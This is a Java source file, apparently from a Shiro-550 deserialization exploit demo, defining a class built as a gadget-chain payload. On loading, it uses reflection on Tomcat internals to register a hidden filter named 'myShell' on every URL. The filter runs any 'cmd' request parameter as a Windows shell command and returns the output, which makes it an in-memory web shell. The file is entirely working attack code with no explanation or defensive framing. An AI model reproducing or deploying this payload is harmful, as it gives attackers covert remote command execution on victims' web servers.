package spring_shiro_550.demo.controller;

import org.apache.catalina.LifecycleState;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.util.LifecycleBase;
import org.apache.xalan.xsltc.DOM;
import org.apache.xalan.xsltc.TransletException;
import org.apache.xalan.xsltc.runtime.AbstractTranslet;
import org.apache.xml.dtm.DTMAxisIterator;
import org.apache.xml.serializer.SerializationHandler;

import javax.servlet.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.EnumSet;

public class injectTomcatFilter extends AbstractTranslet implements Filter {

    static {
        WebappClassLoaderBase classLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardContext standardContext = (StandardContext) classLoader.getResources().getContext();
        ServletContext servletContext = standardContext.getServletContext();
        try {
            Field state_f = LifecycleBase.class.getDeclaredField("state");
            state_f.setAccessible(true);

            state_f.set(standardContext, LifecycleState.STARTING_PREP);

            FilterRegistration.Dynamic filterRegistration = servletContext.addFilter("myShell", new injectTomcatFilter());
            filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, "/*");


            Method filterStart_m = StandardContext.class.getDeclaredMethod("filterStart");
            filterStart_m.invoke(standardContext, null);

            state_f.set(standardContext, LifecycleState.STARTED);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public void init(FilterConfig filterConfig) throws ServletException {

    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        if (servletRequest.getParameter("cmd") != null) {
            String cmd = servletRequest.getParameter("cmd");
            InputStream inputStream = Runtime.getRuntime().exec("cmd /c " + cmd).getInputStream();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream, "gbk"));

            StringBuilder stringBuilder = new StringBuilder();

            String s = null;
            while ((s = bufferedReader.readLine()) != null) {
                stringBuilder.append(s);
            }
            servletResponse.setCharacterEncoding("gbk");
            servletResponse.getWriter().write(stringBuilder.toString());
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    public void destroy() {

    }

    public void transform(DOM dom, DTMAxisIterator dtmAxisIterator, SerializationHandler serializationHandler) throws TransletException {

    }

    public void transform(DOM dom, SerializationHandler[] serializationHandlers) throws TransletException {

    }
}
